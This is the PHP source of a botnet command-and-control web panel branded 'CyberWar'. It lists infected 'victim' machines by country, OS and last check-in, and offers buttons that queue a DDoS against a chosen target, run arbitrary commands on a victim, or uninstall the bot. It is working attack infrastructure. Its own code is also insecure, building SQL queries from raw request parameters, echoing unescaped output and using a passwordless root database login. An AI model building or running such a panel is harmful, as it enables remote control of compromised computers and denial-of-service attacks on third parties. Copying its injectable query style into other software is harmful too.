<?php
include 'inc/db.php';

$dbhost = 'localhost';
$dbuser = 'root';
$dbpass = '';
$dbname = 'cyberwar';

$db = new db($dbhost, $dbuser, $dbpass, $dbname);

session_start();
if(!isset($_SESSION['username'])) {
    header("Location: error.html");
    die();
}

if(isset($_GET['ddos']) && isset($_GET['cmd'])) {
    $query3 = "UPDATE clients SET current_task = 'ddos|".$_GET['cmd']."' WHERE clientid = '" . $_GET['ddos'] . "';";
    $result3 = $db->query($query3);
    //$db->close();  
}
else if(isset($_GET['exec']) && isset($_GET['cmd'])) { 
    $query3 = "UPDATE clients SET current_task = '".$_GET['cmd']."' WHERE clientid = '" . $_GET['exec'] . "';";
    $result3 = $db->query($query3);
    //$db->close(); 
}
else if(isset($_GET['uninstall']) && isset($_GET['cmd'])) {
    $query3 = "UPDATE clients SET current_task = 'uninstall' WHERE clientid = '" . $_GET['uninstall'] . "';";
    $result3 = $db->query($query3);
    //$db->close();
}

$page = 1; //Zuerst setzen wir $page auf 1, damit die Var nicht leer ist.
//Mit dieser kleinen Abfrage prüfen wir, ob die Seite "page" gesetzt ist.
if(!empty($_GET['page'])) {
    $page = filter_input(INPUT_GET, 'page', FILTER_VALIDATE_INT);
    if(false === $page) {
//Ist dies nicht der Fall, lassen wir sie auf 1.
        $page = 1;
    }
}

// Jetzt können wir uns die Anzahl der Einträge pro Seite eingeben.
// Das kann man natürlich auch in eine weiter $_GET Var schreiben.
$items_per_page = 25;

// Der Offset dient nun zur Berechnung für die Abfrage
$offset = ($page - 1) * $items_per_page;
//Anschließend fragen wir mit einem simplen LIMIT die Einträge ab.

$clientcountQuery = $db->query('SELECT * FROM clients WHERE TIMESTAMPDIFF(MINUTE,last_seen,NOW()) < 20');
$clientCount = $clientcountQuery->numRows();
$db->close();
$db = new db($dbhost, $dbuser, $dbpass, $dbname);
$lastdayQuery = $db->query('SELECT * FROM `clients` WHERE DATE(`install_date`) = CURDATE()');
$lastday = $lastdayQuery->numRows();
$db->close();
$db = new db($dbhost, $dbuser, $dbpass, $dbname);
$last30daysQuery = $db->query('SELECT * FROM clients WHERE install_date > now() - interval 30 DAY');
$lastMonth = $last30daysQuery->numRows();
$db->close();
$db = new db($dbhost, $dbuser, $dbpass, $dbname);
$lastyearQuery = $db->query('SELECT * FROM clients WHERE install_date > now() - interval 365 DAY');
$lastYear = $lastyearQuery->numRows();
$db->close();
$db = new db($dbhost, $dbuser, $dbpass, $dbname);
$getEverythingQuery = $db->query("SELECT * FROM `clients` LIMIT " . $offset . "," . $items_per_page)->fetchAll();
$db->close();
$db = new db($dbhost, $dbuser, $dbpass, $dbname);
$total_rows = $db->query('SELECT * FROM clients');
$total_rows = $total_rows->numRows();
$db->close();

$total_pages = ceil($total_rows / $items_per_page);


function code_to_country( $code ){

    $code = strtoupper($code);

    $countryList = array(
        'AF' => 'Afghanistan',
        'AX' => 'Aland Islands',
        'AL' => 'Albania',
        'DZ' => 'Algeria',
        'AS' => 'American Samoa',
        'AD' => 'Andorra',
        'AO' => 'Angola',
        'AI' => 'Anguilla',
        'AQ' => 'Antarctica',
        'AG' => 'Antigua and Barbuda',
        'AR' => 'Argentina',
        'AM' => 'Armenia',
        'AW' => 'Aruba',
        'AU' => 'Australia',
        'AT' => 'Austria',
        'AZ' => 'Azerbaijan',
        'BS' => 'Bahamas the',
        'BH' => 'Bahrain',
        'BD' => 'Bangladesh',
        'BB' => 'Barbados',
        'BY' => 'Belarus',
        'BE' => 'Belgium',
        'BZ' => 'Belize',
        'BJ' => 'Benin',
        'BM' => 'Bermuda',
        'BT' => 'Bhutan',
        'BO' => 'Bolivia',
        'BA' => 'Bosnia and Herzegovina',
        'BW' => 'Botswana',
        'BV' => 'Bouvet Island (Bouvetoya)',
        'BR' => 'Brazil',
        'IO' => 'British Indian Ocean Territory (Chagos Archipelago)',
        'VG' => 'British Virgin Islands',
        'BN' => 'Brunei Darussalam',
        'BG' => 'Bulgaria',
        'BF' => 'Burkina Faso',
        'BI' => 'Burundi',
        'KH' => 'Cambodia',
        'CM' => 'Cameroon',
        'CA' => 'Canada',
        'CV' => 'Cape Verde',
        'KY' => 'Cayman Islands',
        'CF' => 'Central African Republic',
        'TD' => 'Chad',
        'CL' => 'Chile',
        'CN' => 'China',
        'CX' => 'Christmas Island',
        'CC' => 'Cocos (Keeling) Islands',
        'CO' => 'Colombia',
        'KM' => 'Comoros the',
        'CD' => 'Congo',
        'CG' => 'Congo the',
        'CK' => 'Cook Islands',
        'CR' => 'Costa Rica',
        'CI' => 'Cote d\'Ivoire',
        'HR' => 'Croatia',
        'CU' => 'Cuba',
        'CY' => 'Cyprus',
        'CZ' => 'Czech Republic',
        'DK' => 'Denmark',
        'DJ' => 'Djibouti',
        'DM' => 'Dominica',
        'DO' => 'Dominican Republic',
        'EC' => 'Ecuador',
        'EG' => 'Egypt',
        'SV' => 'El Salvador',
        'GQ' => 'Equatorial Guinea',
        'ER' => 'Eritrea',
        'EE' => 'Estonia',
        'ET' => 'Ethiopia',
        'FO' => 'Faroe Islands',
        'FK' => 'Falkland Islands (Malvinas)',
        'FJ' => 'Fiji the Fiji Islands',
        'FI' => 'Finland',
        'FR' => 'France, French Republic',
        'GF' => 'French Guiana',
        'PF' => 'French Polynesia',
        'TF' => 'French Southern Territories',
        'GA' => 'Gabon',
        'GM' => 'Gambia the',
        'GE' => 'Georgia',
        'DE' => 'Germany',
        'GH' => 'Ghana',
        'GI' => 'Gibraltar',
        'GR' => 'Greece',
        'GL' => 'Greenland',
        'GD' => 'Grenada',
        'GP' => 'Guadeloupe',
        'GU' => 'Guam',
        'GT' => 'Guatemala',
        'GG' => 'Guernsey',
        'GN' => 'Guinea',
        'GW' => 'Guinea-Bissau',
        'GY' => 'Guyana',
        'HT' => 'Haiti',
        'HM' => 'Heard Island and McDonald Islands',
        'VA' => 'Holy See (Vatican City State)',
        'HN' => 'Honduras',
        'HK' => 'Hong Kong',
        'HU' => 'Hungary',
        'IS' => 'Iceland',
        'IN' => 'India',
        'ID' => 'Indonesia',
        'IR' => 'Iran',
        'IQ' => 'Iraq',
        'IE' => 'Ireland',
        'IM' => 'Isle of Man',
        'IL' => 'Israel',
        'IT' => 'Italy',
        'JM' => 'Jamaica',
        'JP' => 'Japan',
        'JE' => 'Jersey',
        'JO' => 'Jordan',
        'KZ' => 'Kazakhstan',
        'KE' => 'Kenya',
        'KI' => 'Kiribati',
        'KP' => 'Korea',
        'KR' => 'Korea',
        'KW' => 'Kuwait',
        'KG' => 'Kyrgyz Republic',
        'LA' => 'Lao',
        'LV' => 'Latvia',
        'LB' => 'Lebanon',
        'LS' => 'Lesotho',
        'LR' => 'Liberia',
        'LY' => 'Libyan Arab Jamahiriya',
        'LI' => 'Liechtenstein',
        'LT' => 'Lithuania',
        'LU' => 'Luxembourg',
        'MO' => 'Macao',
        'MK' => 'Macedonia',
        'MG' => 'Madagascar',
        'MW' => 'Malawi',
        'MY' => 'Malaysia',
        'MV' => 'Maldives',
        'ML' => 'Mali',
        'MT' => 'Malta',
        'MH' => 'Marshall Islands',
        'MQ' => 'Martinique',
        'MR' => 'Mauritania',
        'MU' => 'Mauritius',
        'YT' => 'Mayotte',
        'MX' => 'Mexico',
        'FM' => 'Micronesia',
        'MD' => 'Moldova',
        'MC' => 'Monaco',
        'MN' => 'Mongolia',
        'ME' => 'Montenegro',
        'MS' => 'Montserrat',
        'MA' => 'Morocco',
        'MZ' => 'Mozambique',
        'MM' => 'Myanmar',
        'NA' => 'Namibia',
        'NR' => 'Nauru',
        'NP' => 'Nepal',
        'AN' => 'Netherlands Antilles',
        'NL' => 'Netherlands the',
        'NC' => 'New Caledonia',
        'NZ' => 'New Zealand',
        'NI' => 'Nicaragua',
        'NE' => 'Niger',
        'NG' => 'Nigeria',
        'NU' => 'Niue',
        'NF' => 'Norfolk Island',
        'MP' => 'Northern Mariana Islands',
        'NO' => 'Norway',
        'OM' => 'Oman',
        'PK' => 'Pakistan',
        'PW' => 'Palau',
        'PS' => 'Palestinian Territory',
        'PA' => 'Panama',
        'PG' => 'Papua New Guinea',
        'PY' => 'Paraguay',
        'PE' => 'Peru',
        'PH' => 'Philippines',
        'PN' => 'Pitcairn Islands',
        'PL' => 'Poland',
        'PT' => 'Portugal, Portuguese Republic',
        'PR' => 'Puerto Rico',
        'QA' => 'Qatar',
        'RE' => 'Reunion',
        'RO' => 'Romania',
        'RU' => 'Russian Federation',
        'RW' => 'Rwanda',
        'BL' => 'Saint Barthelemy',
        'SH' => 'Saint Helena',
        'KN' => 'Saint Kitts and Nevis',
        'LC' => 'Saint Lucia',
        'MF' => 'Saint Martin',
        'PM' => 'Saint Pierre and Miquelon',
        'VC' => 'Saint Vincent and the Grenadines',
        'WS' => 'Samoa',
        'SM' => 'San Marino',
        'ST' => 'Sao Tome and Principe',
        'SA' => 'Saudi Arabia',
        'SN' => 'Senegal',
        'RS' => 'Serbia',
        'SC' => 'Seychelles',
        'SL' => 'Sierra Leone',
        'SG' => 'Singapore',
        'SK' => 'Slovakia (Slovak Republic)',
        'SI' => 'Slovenia',
        'SB' => 'Solomon Islands',
        'SO' => 'Somalia, Somali Republic',
        'ZA' => 'South Africa',
        'GS' => 'South Georgia and the South Sandwich Islands',
        'ES' => 'Spain',
        'LK' => 'Sri Lanka',
        'SD' => 'Sudan',
        'SR' => 'Suriname',
        'SJ' => 'Svalbard & Jan Mayen Islands',
        'SZ' => 'Swaziland',
        'SE' => 'Sweden',
        'CH' => 'Switzerland, Swiss Confederation',
        'SY' => 'Syrian Arab Republic',
        'TW' => 'Taiwan',
        'TJ' => 'Tajikistan',
        'TZ' => 'Tanzania',
        'TH' => 'Thailand',
        'TL' => 'Timor-Leste',
        'TG' => 'Togo',
        'TK' => 'Tokelau',
        'TO' => 'Tonga',
        'TT' => 'Trinidad and Tobago',
        'TN' => 'Tunisia',
        'TR' => 'Turkey',
        'TM' => 'Turkmenistan',
        'TC' => 'Turks and Caicos Islands',
        'TV' => 'Tuvalu',
        'UG' => 'Uganda',
        'UA' => 'Ukraine',
        'AE' => 'United Arab Emirates',
        'GB' => 'United Kingdom',
        'US' => 'United States of America',
        'UM' => 'United States Minor Outlying Islands',
        'VI' => 'United States Virgin Islands',
        'UY' => 'Uruguay, Eastern Republic of',
        'UZ' => 'Uzbekistan',
        'VU' => 'Vanuatu',
        'VE' => 'Venezuela',
        'VN' => 'Vietnam',
        'WF' => 'Wallis and Futuna',
        'EH' => 'Western Sahara',
        'YE' => 'Yemen',
        'ZM' => 'Zambia',
        'ZW' => 'Zimbabwe'
    );

    if( !$countryList[$code] ) return $code;
    else return $countryList[$code];
    }

?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Table - CyberWar Clients</title>
    <meta name="description" content="CyberWar Botnet Management Console">
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="assets/fonts/fontawesome5-overrides.min.css">
</head>

<body id="page-top">
    <div id="wrapper">
        <nav class="navbar navbar-dark align-items-start sidebar sidebar-dark accordion bg-gradient-primary p-0">
            <div class="container-fluid d-flex flex-column p-0"><a class="navbar-brand d-flex justify-content-center align-items-center sidebar-brand m-0" href="#">
                    <div class="sidebar-brand-icon rotate-n-15"><i class="fas fa-laugh-wink"></i></div>
                    <div class="sidebar-brand-text mx-3"><span>CyberWar</span></div>
                </a>
                <hr class="sidebar-divider my-0">
                <ul class="navbar-nav text-light" id="accordionSidebar">
                    <li class="nav-item"><a class="nav-link" href="index.php"><i class="fas fa-tachometer-alt"></i><span>Dashboard</span></a></li>
                    <li class="nav-item"><a class="nav-link active" href="clients.php"><i class="fas fa-table"></i><span>Vicitims</span></a></li>
                    <li class="nav-item"><a class="nav-link" href="login.html"><i class="far fa-user-circle"></i><span>Settings</span></a></li>
                    <li class="nav-item"><a class="nav-link" href="blank.html"><i class="fas fa-window-maximize"></i><span>Running Tasks</span></a></li>
                </ul>
                <div class="text-center d-none d-md-inline"><button class="btn rounded-circle border-0" id="sidebarToggle" type="button"></button></div>
            </div>
        </nav>
        <div class="d-flex flex-column" id="content-wrapper">
            <div id="content">
            <nav class="navbar navbar-light navbar-expand bg-white shadow mb-4 topbar static-top">
                    <div class="container-fluid"><button class="btn btn-link d-md-none rounded-circle me-3" id="sidebarToggleTop" type="button"><i class="fas fa-bars"></i></button>
                        <ul class="navbar-nav flex-nowrap ms-auto">
                            <li class="nav-item dropdown d-sm-none no-arrow"><a class="dropdown-toggle nav-link" aria-expanded="false" data-bs-toggle="dropdown" href="#"><i class="fas fa-search"></i></a>
                                <div class="dropdown-menu dropdown-menu-end p-3 animated--grow-in" aria-labelledby="searchDropdown">
                                    <form class="me-auto navbar-search w-100">
                                        <div class="input-group"><input class="bg-light form-control border-0 small" type="text" placeholder="Search for ...">
                                            <div class="input-group-append"><button class="btn btn-primary py-0" type="button"><i class="fas fa-search"></i></button></div>
                                        </div>
                                    </form>
                                </div>
                            </li>
                            <li class="nav-item dropdown no-arrow mx-1"></li>
                            <li class="nav-item dropdown no-arrow mx-1">
                                <div class="nav-item dropdown no-arrow"><a class="dropdown-toggle nav-link" aria-expanded="false" data-bs-toggle="dropdown" href="#">Settings&nbsp;<i class="fas fa-hand-spock fa-fw"></i></a>
                                    <div class="dropdown-menu dropdown-menu-end dropdown-list animated--grow-in">
                                        <h6 class="dropdown-header">User Center</h6><a class="dropdown-item d-flex align-items-center" href="#">
                                            <div class="fw-bold">
                                                <div class="text-truncate"><span>Settings for: <?php echo $_SESSION['username'];?></span></div>
                                                <p class="small text-gray-500 mb-0"><(^.^<)</p>
                                            </div>
                                        </a><a class="dropdown-item text-center small text-gray-500" href="login.php?logout">LogOut</a>
                                    </div>
                                </div>
                                <div class="shadow dropdown-list dropdown-menu dropdown-menu-end" aria-labelledby="alertsDropdown"></div>
                            </li>
                            <li class="nav-item dropdown no-arrow"></li>
                        </ul>
                    </div>
                </nav>
                <div class="container-fluid">
                    <h3 class="text-dark mb-4">Overview</h3>
                    <div class="card shadow">
                        <div class="card-header py-3">
                            <p class="text-primary m-0 fw-bold">Clients</p>
                        </div>
                        <div class="card-body">
                            <div class="row">
                            <div class="container-fluid">
                                <div class="row">
                                    <div class="col-md-12">
                                        <table class="table table-striped">
                                        <thead>
                                            <tr>
                                                <th>
                                                    #
                                                </th>
                                                <th>
                                                    Country
                                                </th>
                                                <th>
                                                    ClientID
                                                </th>
                                                <th>
                                                    OS
                                                </th>
                                                <th>
                                                    Last Command
                                                </th>
                                                <th>
                                                    Last Seen
                                                </th>
                                                <th>
                                                    Actions
                                                </th>
                                            </tr>
                                        </thead>
                                            <tbody>
                                                <?php
                                                    foreach ($getEverythingQuery as $getEverything) {
                                                    echo "<tr>";    
                                                    echo "<td>";
                                                    echo $getEverything['id'];
                                                    echo "</td>";
                                                    echo "<td>";
                                                    $getCountryCode = file_get_contents('http://api.hostip.info/country.php?ip=' .$getEverything['ip']);
                                                    echo "<img src='https://ipdata.co/flags/".strtolower($getCountryCode).".png'>";
                                                    echo " " .code_to_country($getCountryCode);
                                                    echo "</td>";
                                                    echo "<td>";
                                                    echo $getEverything['clientid'];
                                                    echo "</td>";
                                                    echo "<td>";
                                                    echo $getEverything['os'];
                                                    echo "</td>";
                                                    echo "<td>";
                                                    echo $getEverything['last_task'];
                                                    echo "</td>";
                                                    echo "<td>";
                                                    echo $getEverything['last_seen'];
                                                    echo "</td>";
                                                    echo "<td>";
                                                    echo "<form action='clients.php' method='GET'>
                                                    <div class='form-group'>
                                                      <input type='text' class='form-control' name='cmd' id='cmd' placeholder='Enter IP, Command ....'>
                                                      <button type='submit' name='ddos' value='".$getEverything['clientid']."' class='btn btn-primary btn-sm'>Start DDoS</button>
                                                      <button type='submit' name='exec' value='".$getEverything['clientid']."' class='btn btn-primary btn-sm'>Exec Command</button>
                                                      <button type='submit' name='uninstall' value='".$getEverything['clientid']."' class='btn btn-danger btn-sm'>Uninstall</button>
                                                    </div>
                                                  </form>";
                                                    echo "</td>";
                                                    echo "</tr>";  
                                                    }
                                                ?>
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-6 align-self-center">
                                    <p id="dataTable_info" class="dataTables_info" role="status" aria-live="polite">
                                        <ul class="pagination">
                                            <li class="page-item"><a class="page-link" href="?pageno=1">First</a></li>
                                            <li class="page-item"<?php if($page <= 1){ echo 'disabled'; } ?>>
                                                <a class="page-link" href="<?php if($page <= 1){ echo '#'; } else { echo "?pageno=".($page - 1); } ?>">Prev</a>
                                            </li>
                                            <?php
                                            for ($i = 1; $i <= $total_pages; $i++) {
                                               echo "<li class='page-item'><a class='page-link' href='?pageno=". $i . "'>". $i ."</a></li>";
                                            }
                                            ?>
                                            <li class="page-item"<?php if($page >= $total_pages){ echo 'disabled'; } ?>>
                                                <a class="page-link" href="<?php if($page >= $total_pages){ echo '#'; } else { echo "?pageno=".($page + 1); } ?>">Next</a>
                                            </li>
                                            <li class="page-item"><a class="page-link" href="?pageno=<?php echo $total_pages; ?>">Last</a></li>
                                        </ul>
                                        
                                    </p>
                                </div>
                                <div class="col-md-6">
                                        !ENDE!
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <footer class="bg-white sticky-footer">
                <div class="container my-auto">
                    <div class="text-center my-auto copyright"><span>Copyright © CyberWar 2021</span></div>
                </div>
            </footer>
        </div><a class="border rounded d-inline scroll-to-top" href="#page-top"><i class="fas fa-angle-up"></i></a>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.0.0-beta2/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.8.0/Chart.bundle.min.js"></script>
    <script src="assets/js/script.min.js"></script>
</body>

</html>